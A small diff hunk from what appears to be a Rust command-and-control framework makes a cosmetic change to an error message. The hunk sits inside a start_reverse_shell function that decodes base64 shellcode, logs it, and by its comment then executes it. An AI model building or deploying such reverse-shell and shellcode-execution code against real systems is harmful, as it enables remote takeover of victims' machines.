@@ -17,7 +17,7 @@ pub async fn start_reverse_shell(shellcode: String) -> C2Result<()> {
     // Decode the base64 shellcode
     let shellcode_bytes = general_purpose::STANDARD
         .decode(&shellcode)
-        .map_err(|e| common::error::C2Error::Other(format!("Failed to decode shellcode: {}", e)))?;
+        .map_err(|e| common::error::C2Error::Other(format!("Failed to decode shellcode: {e}")))?;
     info!("Decoded shellcode: {:?}", shellcode_bytes);
 
     // Execute the shellcode directly using a simple approach
